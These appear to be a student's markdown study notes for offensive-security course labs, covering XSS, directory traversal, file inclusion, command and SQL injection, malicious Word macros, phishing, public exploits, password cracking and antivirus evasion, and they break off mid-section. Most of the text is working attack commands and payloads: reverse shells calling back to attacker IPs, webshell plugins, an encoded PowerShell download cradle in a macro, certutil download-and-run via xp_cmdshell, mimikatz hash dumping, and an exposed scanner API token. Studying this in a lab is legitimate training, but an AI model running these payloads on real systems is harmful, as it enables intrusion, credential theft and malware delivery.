    Browse about us page http://offsecwp/?p=1 > burp suite check response content > search the flag OS{
  - enumerate APIs
    ```
    nano pattern
    {GOBUSTER}/v1
    {GOBUSTER}/v2

    gobuster dir -u http://192.168.173.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
    curl -i http://192.168.173.16:5002/users/v1
    curl -i http://192.168.173.16:5002/books/v1
    ```
  - site-maps browsing (robots.txt, sitemap.xml)
    `nikto -h http://192.168.173.52`  
  - read http header via curl and decode base64 via [CyberChef](https://gchq.github.io/CyberChef/)
    `curl -i http://192.168.173.52`
  - find flag in html, css, js
    burp suite http history + filter by search item 'flag' + browser console run function
- 8.4 cross-site scripting
  - XSS attack in user-agent - create new user and privilege via xss
    - login http://offsecwp/wp-login.php (admin, password)
    - JSCompress
      ```
      var ajaxRequest = new XMLHttpRequest();
      var requestURL = "/wp-admin/user-new.php";
      var nonceRegex = /ser" value="([^"]*?)"/g;
      ajaxRequest.open("GET", requestURL, false);
      ajaxRequest.send();
      var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
      var nonce = nonceMatch[1];
      var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
      ajaxRequest = new XMLHttpRequest();
      ajaxRequest.open("POST", requestURL, true);
      ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      ajaxRequest.send(params);
      ```
    - Run this function and get the encoded js
      ```
      function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
      let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
      console.log(encoded)
      ```
    - intercept the burp request and modify the user-agent
      ```
      <script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>
      ```
  - **Capstone Lab**: craft a wordpress plugin that embeds a web shell and enumerate the target system (locate the flag)  
    - https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
    - `nano webshell.php`
    - `zip webshell.zip webshell.php`
    - Upload plugin.zip and activate
    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null`: find flag  
    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag`

### Common Web Application Attacks  
- 9.1.2 Identifying and Exploiting Directory Traversals
  - obtain SSH private key for the user offsec then SSH
    - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
    - nano dt_key (-----BEGIN OPENSSH PRIVATE KEY----- -----END OPENSSH PRIVATE KEY-----)
    - ssh -i dt_key -p 2222 offsec@mountaindesserts.com  
  - golangexample cve-2021-43798 port 3000
    - `curl --path-as-is http://192.168.163.193:3000/public/plugins/alertlist/../../../../../../../../users/install.txt`
- 9.1.3 Encoding special chrs
  - url encoding (Don't normalize the url)
    - `curl --path-as-is http://192.168.163.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords`
  - Grafana URL partial encoding bypass
    - `curl --path-as-is http://192.168.163.16:3000/public/plugins/alertlist/%2E./%2E./%2E./%2E./../../../../opt/install.txt`
- 9.2.1 Local file inclusion (LFI)
  - write system cmd to **access.log** file  
    embed system cmd  
    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`  
    run url encoding web shell command  
    `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`
  - LFI **/opt/admin.bak.php**  
    `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
  - windows LFI + **Log poisoning** C:\xampp\apache\logs\  
    Modify user agent:  `<?php echo system($_GET['cmd']); ?>`  
    `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt`
- 9.2.2 PHP Wrappers
  - LFI **php://filter** to include content of /var/www/html/backup.php  
    `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`  
  - LFI **data://** PHP to execute uname -a  
    base64: echo -n `<?php echo system($_GET["cmd"]);?>`   
    `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
- 9.2.3 Remote File inclusion (RFI)
  - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**  
    `cd /usr/share/webshells/php/`   
    `python3 -m http.server 80`
    `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.221/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"`
  - RFI to include **PHP reverse shell** from Pentestmonkey's GitHub + change the IP to kali + port 4444 + exploit port 8001
    1. download reverse_shell from https://github.com/pentestmonkey/php-reverse-shell
    2. change kali ip and port 4444 in .php
    3. python3 -m http.server 80
    4. nc -nvlp 4444
    5. `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`  
- 9.3.1 Using executable files
  - File upload + **bypass file extension filter** (.pHp) + read windows file C:\xampp\passwords.txt  
    `curl http://192.168.224.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt`  
  - **Web shell code executio**n
    start Apache of webshell + nc listener + upload php-reverse-shell.php. Uploaded files in /var/www/html/  
    `curl http://192.168.224.16/php-reverse-shell.php`  
    `cat /opt/install.txt`  
- 9.3.2 Using non executable files
   - **overwrite the authorized_keys** file with the file upload mechanism + ssh port 2222  
     at kali@kali home: `ssh-keygen`  `cat fileup.pub > authorized_keys`  

     intercept burp upload request  
     POST /upload HTTP/1.1  
     filename=`../../../../../../../root/.ssh/authorized_keys`  

     at kali@kali home: `rm ~/.ssh/known_hosts`  
     `ssh -p 2222 -i fileup root@mountaindesserts.com`  
- 9.4.1 OS Command injection
  - **PowerShell** reverse shell + windows
    ```
    1. Git command testing 
    curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
    curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

    determining where the injected commands are execute
    curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

    2. Server Powercat via web server
    cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
    python3 -m http.server 80

    3. netcat listen
    nc -nvlp 4444

    4. Exploit/curl
    curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.170%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.170%20-p%204444%20-e%20powershell' http://192.168.203.189:8000/archive

    5. Go to desktop and find the flag
    cd C:\Users\Administrator\Desktop
    type secrets.txt
    ```    
  - Netcat reverse shell + elevated priviledge (sudo su) + linux  
    `nc 192.168.45.170 4444 -e /bin/bash`  
    `curl -X POST --data 'Archive=nc%20192.168.45.170%204444%20-e%20%2Fbin%2Fbash' http://192.168.203.16/archive`  
    whoami  
    sudo su  
    cat /opt/config.txt  
  - **Capstone lab**: identify os command vulnerabilities + bash shell reverse shell
    Test each input field one at a time (Burp intruter)
    ```
    ; id
    && id
    $(id)
    `id`
    ```
    Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
    Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
- **Capstone lab**: aspx webshell
  upload file from /usr/share/webshells/aspx/cmdasp.aspx  
  browse port 80 for uploaded shell: http://192.168.132.192/cmdasp.aspx  
  type C:\inetpub\flag.txt  

### SQL injection attacks
- 10.1.2 DB types and characteristic
  - MYSQL retrieve record
    ```
    mysql -u root -p'root' -h 192.168.132.16 -P 3306 --skip-ssl
    SELECT version();
    SELECT system_user();
    SHOW databases;  --db
    USE mysql;  --use db
    SHOW TABLES;  --table
    DESCRIBE user;  --columns
    SELECT user, plugin FROM mysql.user WHERE user = 'offsec';

    exit
    ```
  - MSSQL system table
    ```
    impacket-mssqlclient Administrator:Lab123@192.168.132.18 -windows-auth
    SELECT @@version;
    SELECT name FROM sys.databases;  --db
    USE master;  --use db
    SELECT * FROM information_schema.tables; --table
    SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'user'; --columns
    SELECT name FROM sysobjects WHERE xtype = 'S'; --systemtables sysusers
    SELECT uid, name from sysusers order by uid;  --first record
    ```
  - MYSQL to explore table
    ```
    mysql -u root -p'root' -h 192.168.132.16 -P 3306 --skip-ssl
    USE test;
    SHOW TABLES;
    SELECT * FROM users
    ```
- 10.33.1 Manual Code execution
  - error based  
    username: offsec'  
    `offsec' OR 1=1 --//`  
    `' or 1=1 in (select @@version) -- //`  
    `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`  
  - union-based
    ```
    ' ORDER BY 1 -- //
    %' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
    %' UNION SELECT database(), user(), @@version, null, null -- //
    ' UNION SELECT null, null, database(), user(), @@version  -- //
    ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
    ' UNION SELECT null, username, password, description, null FROM users -- //
    ```
  - time-based  
    `' AND IF (1=1, sleep(3),'false') -- //`  
  - boolean-based  
    `' AND 1=1 -- //`  
- 10.3.2. Automating the Attack  
  - ERROR-based mysql login bypass  
    `' OR 1=1 # `  
    `' or 1=1 in (select @@version) #`  
    `' OR 1=1 in (SELECT password FROM users) #`  
    https://10015.io/tools/md5-encrypt-decrypt    
  - UNION-based  mysql  
    identify number of columns: 5  
    `' ORDER BY 1 #`   > until error hit : E.g 6 hit, then columns are 5  
    current database name, version, user: offsec  
    `' UNION SELECT 'a', database(), @@version, user(), 'e' # `  
    List all databases: mysql  
    `' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata #`  
    List current db tables and columns: customers, users  
    `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() #`  
    Dump data from a specific table  
    `' UNION SELECT null, username, password, null, null FROM users #`  
    Upload webshell  
    `' UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" #`  
    Execute webshell  
    `http://192.168.173.19/tmp/webshell.php?cmd=find%20/%20-name%20%22flag.txt%22%202%3E/dev/null`  
    `http://192.168.173.19/tmp/webshell.php?cmd=cat%20flag.txt`  
  - sqlmap time based  
    Find SQL injection points: time-based blind  
    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user`  
    Dump data from table (slow) - one click  
    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user --dump`  
    List database  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user --dbs --batch --threads=5`  
    List tables  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec --tables --batch --threads=5`  
    Dump data for the table  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec -T users --dump --batch --threads=5`  
  - **Capstone Lab**: Wordpress vulnerable plugin - Unauthenticated SQL Injection - reverse shell upload
    1. add etc/hosts: alvida-eatery.org
    2. web vulnerability scan
       - `nikto -h http://alvida-eatery.org`
       - `whatweb http://alvida-eatery.org`
       - `gobuster dir -u http://alvida-eatery.org -w /usr/share/wordlists/dirb/common.txt -t5`
       - `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c`
       - **Output: WordPress 6.0, wp-login.php found, [vulnerable plugin - Unauthenticated SQL Injection](https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad (Unauthenticated SQL Injection))**  
    4. login portal disclose user 'admin'
    5. PoC http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users  
    6. Password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (WordPress hash password~hahs.txt)
    7. `john --format=phpass hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`: 'hulabaloo'
    8. Login to wordpress portal   
    9. Create a webshell plugin index.php-->plug.zip (change kali ip, unuse port 4444,8888)
       ```
       <?php
		/**
		* Author: Saeed Bala
		* Plugin Name: PHP Code Plugin
		* Description: Shell Through Plugins
		* Version: 1.0
		*/
		exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.165/8888 0>&1'");
		?>
       ```      
       `zip -r plug.zip index.php`  
    11. `nc -nvlp 8888`
    12. Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin and upload plug.zip > install > activate plugin
    13. netcat got response and find the flag `find / -name "flag.txt" 2>/dev/null`  
  - **Capstone Lab**: UNION based write shells to server - INTO OUTFILE  
    1. `Capture POST request of "subscribe" function in website  
    2. `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`  
    3. `mail-list=hello@gmail.com' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE '/var/www/html/shell.php' #`  
    4. `http://192.168.169.48/shell.php?cmd=cat%20/var/www/flag.txt`  
  - **Capstone Lab**: TIME based xp_cmdshell mssql  
    sql probe: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
    1. start a web server to host nc64.exe  
       download nc64.exe from https://github.com/int0x33/nc.exe/blob/master/nc64.exe  
       `sudo mv nc64.exe /var/www/html/`
       `sudo python3 -m http.server 80`
       `nc -lvnp 4444`
    3. Inject via SQLi (download netcat)  
       `';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.165/nc64.exe c:/windows/temp/nc64.exe";--`  
    5. Inject to trigger reverse shell  
       `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`
    4. `C:\Windows\system32> where /r C:\ flag.txt`  

### Client-site attacks  
- 12.1.1 Information Gathering
  - Metadata of pdf (Author)
    `wget http://192.168.203.197/old.pdf`
    `exiftool -a -u old.pdf`
  - Find pdf of webserver
    `gobuster dir -u http://192.168.203.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf`
- 12.2.3. Leveraging Microsoft Word Macros
  `xfreerdp3 /u:offsec /p:lab /v:192.168.203.196`
  Save "MyMacro" as doc file. View Macro  
    
  ```
  Use powershell OneLiner to base64-encode
  $command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.203.196/powercat.ps1');powercat -c 192.168.203.196 -p 4444 -e powershell"
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  $encodedCommand

  nano splitstring.py
  `str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAzAC4AMQA5ADYALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4AMgAwADMALgAxADkANgAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="`

  n = 50

  for i in range(0, len(str), n):
	  print("Str = Str + " + '"' + str[i:i+n] + '"')

  python3 ./splitstring.py
  ```

  ```
  Sub AutoOpen()
       MyMacro
  End Sub
    
  Sub Document_Open()
      MyMacro
  End Sub
    
  Sub MyMacro()
      Dim Str As String
        
      Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
          Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
          Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
       ...
          Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
          Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
          Str = Str + "A== "
    
      CreateObject("Wscript.Shell").Run Str
  End Sub
  ```

  ```
  cd /usr/share/powershell-empire/empire/server/data/module_source/management/
  python3 -m http.server 80
  nc -nvlp 4444
  ```
  open the MyMacro doc.

- 12.2.3 capstone lab email phish to send over windows libray files
  - Install and start wsgidav for shared folder  
    ```
    pipx install wsgidav
    mkdir /home/kali/webdav
    /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
    ```
  - Start PowerCat on port 8000  
    `cd usr/…/server/data/module_source/management`  
    `python3 -m http.server 8000`  
  - nc -nvlp 4444  
  - Remote to VM3 to draf windows library files: xfreerdp3 /u:offsec /p:lab /v:192.168.158.194
  - Create New File config.Library-ms in visual studio core
    ```
    <?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://<KALI></url> 
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>
    ```
  - Create .ink shortcut file and save as "automatic_configuration"  
    `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 4444 -e powershell"`  
  - Copy automatic_configuration.lnk, config.Library-ms to the "execute config" folder  
  - Enumerate target web server  
    ```
    gobuster dir -u http://192.168.158.199/ -w /usr/share/wordlists/dirb/common.txt -x pdf
    wget http://192.168.158.199/info.pdf
    exiftool -a -u info.pdf
    Author: Dave Wizard
    ```
  - Open PDF, get the email recipient and credentials (test@supermagicorg.com, test)
  - email phishing attack (target IP)  
    `sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.158.199 --body @body.txt --header "Subject: Problems" --suppress-data`
  - netcat reverse shell received: `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue`

### Locating public exploits   
- mouse server - [WiFi Mouse 1.7.8.5 - Remote Code Execution](https://www.exploit-db.com/exploits/50972)
  - connect to SMB download folders to get hints
    ```
    smbclient \\\\192.168.171.10\\Users -N : Connect to the Users share anonymously
    smb: \offsec\Downloads\> ls
    MouseServer.exe 
    ```
  - `searchsploit "mouse server"`: windows/remote/50972.py 
  - generate windows reverse shell payload
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
  - `python3 -m http.server 80`
  - `nc -lvnp 443`
  - `python3 mouseserver_50972.py 192.168.171.10 192.168.45.165 shell64.exe`  
- Apache httpd 2.4.49 -  [Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)
  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh
  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`
- JAMES Remote Admin 2.3.2 - [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50347)
  - `ssh -p 32826 student@192.168.170.52`  
  - `searchsploit "JAMES Remote 2.3.2"`: linux/remote/50347.py  
  - change the port of “James Remote Administration Tool”， “SMTP” in 50347.py  
  - `python3 JAMESAdmin232_50347.py 192.168.170.52 192.168.45.165 443`
    
### Fixing exploits  
- **Capstone lab**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution
  - Modify 44976.py
    ```
    username = "offsec" # change username
    password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ" # change password
    base_url = "http://192.168.171.52/cmsms/admin" # change from "http://192.168.1.10/cmsms/admin"
    ```
  - `python2 44976.py`
  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`  
- **Capstone lab**: elFinder 2.1.47 - 'PHP connector' Command Injection
  - `gobuster dir -u http://192.168.171.46:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t5`: http://192.168.171.46/seclab/
  - `searchsploit elFinder` [elFinder 2.1.47 - 'PHP connector' Command Injection](https://www.exploit-db.com/exploits/46481)
  - inspect the code
    ```
    url = sys.argv[1]` #expect url param
    payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg
    ```
  - `cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg`  
  - `python2 46481.py http://192.168.171.46/seclab/`  
  - `cat /var/www/http/seclab/php/flag.txt`
- **Capstone lab**: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
  - `nmap -sVC -p- -v -T4 -sT --open 192.168.171.213`: 20000/tcp open  http  Easy Chat Server httpd 1.0
  - `searchsploit Easy Chat Server`: [Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/50999)  
  - Generate shellcode  
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`： original one not working with netcat listener as meterpreter using
    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`  
  - Modify shellcode
    ```
    shellcode = b"\x90" * 16
    shellcode += b"\xbe\xb6\x52\x38\xbc\xda\xc1\xd9\x74\x24\xf4"
    ...

    buffer += b"Host: 192.168.171.213:20000\r\n"   #target ip+port
    buffer += b"Referer: http://192.168.171.213\r\n"
    ```
  - Start netcat listener: `nc -lvnp 443`
  - Exploit `python2 easychat_50999.py 192.168.171.213 20000`
  - type C:\Users\Administrator\Desktop\flag.txt

### Password Attacks  
- 15.1 Attacking network services login  
  - **SSH** guess password
    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`  
    `ssh -p 2222 george@192.168.157.201`  
  - **RDP** guess user and export flag to local
    `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`
    `mkdir -p ~/share`: create shared folder
    `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/share`: login to RDP and export flag to local
  - **ftp** guess password
    `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
    `ftp itadmin@192.168.160.202`
    `get flag.txt`
  - HTTP POST Login Form
    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password"`
  - HTTP GET basic authen
    `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-get /`
- 15.2 Password cracking
  - MD5 hash "056df33e47082c77148dba529212d50a" + rule "1@3$5" + rockyou.txt
    `cat demo.rule: $1 $@ $3 $$ $5`  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo4.rule --force`  
  - MD5 hash "19adc0e8921336d08502c039dc297ff8" + rule all letters upper case
    `cat demo5.rule: u d`  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo5.rule --force`  
  - Dictionary attack with user 'nadine'
    `hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.161.227`
    ```
    ##User's machine copy kbdx to kali
    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

    ##kali
    keepass2john Database.kdbx > keepass.hash
    cat keepass.hash`  remove the "Database"
    hashcat --help | grep -i "KeePass"
    hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  
    ```
  - SSH passphrase for user 'alfred'
    - `searchsploit "Apache 2.4.49"` > HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
    - `curl --path-as-is http://192.168.161.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa -o id_rsa`  
    - crack password by using john: Superstar137!  
      ```
      nano ssh.rule
      [List.Rules:sshRules]
      c $1 $3 $7 $!  
      c $1 $3 $7 $@  
      c $1 $3 $7 $#  
      
      ssh2john id_rsa > ssh.hash
      hashcat -h | grep -i "ssh"
      hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
      sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'
      john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
      ```
   - ssh with the cracked passphrase
     ```
     rm ~/.ssh/known_hosts
     chmod 600 id_rsa
     ssh -i id_rsa -p 2223 alfred@192.168.161.201
     ```
- 15.3 Password hashed
  - Cracking NTLM
    - `xfreerdp3 /u:nadine /p:123abc /v:192.168.139.227 /cert:ignore /drive:share,/home/kali/share`
    - Run powershell as admin `.\mimikatz.exe`
    - dump the hash
      ```
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - Crack the hash in kali
      ```
      nano steve.hash 
      hashcat --help | grep -i "ntlm" > 1000 | NTLM | Operating System
      hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
      ```
  - Passing NTLM (refer note)
  - Cracking Net-NTLMv2 via web app upload
    - sudo responder -I tun0  
    - Burp suite - file upload > change file name > \\\\192.168.45.181\\test > listener captured NTLMv2 hash  
    - Kali `nano sam.hash`  
    - `hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force` > DISISMYPASSWORD  
  - Relaying Net-NTLMv2 via web
    - Starting ntlmrelayx for a Relay-attack targeting FILES02
      ```
      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.181",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText
      ```
    - start netcat listener `nc -nvlp 8080`
    - Using the dir command to create an SMB connection to our Kali machine
      `dir \\192.168.45.181\test` in web portal os command  

### Antivirus Evasion  
- **Capstone Lab**: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
  - install Veil framework
    ```
    sudo apt -y install veil
    /usr/share/veil/config/setup.sh --force --silent
    ```
  - geneate bat file via Veil
    ```
    sudo veil
    Veil>: use 1
    list
    Veil/Evasion>: use 22
    set LHOST 192.168.45.220
    generate
    Please enter the base name for output files (default is payload): configuration-file
    exit
    
    cp /var/lib/veil/output/source/configuration-file.bat .
    ```
  - Another terminal run meterpreter listener
    `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
  - transfer file to ftp as anonymous
    ```
    ftp -a -A 192.168.104.53
    ftp> bin
    ftp> put configuration-file.bat
    ```

### Windows Privilege Escalation  
- 17.1.2 Situation Awareness  
  `nc 192.168.139.220 4444` `whoami` `Get-LocalUser`  `Get-LocalGroup` `Get-Content -Path .\LocalUsersGroups.csv`   
  - Display member for group "Remote Management Users"   
    `Get-LocalGroupMember "Remote Management Users"`  
  - List installed apps  
    ```
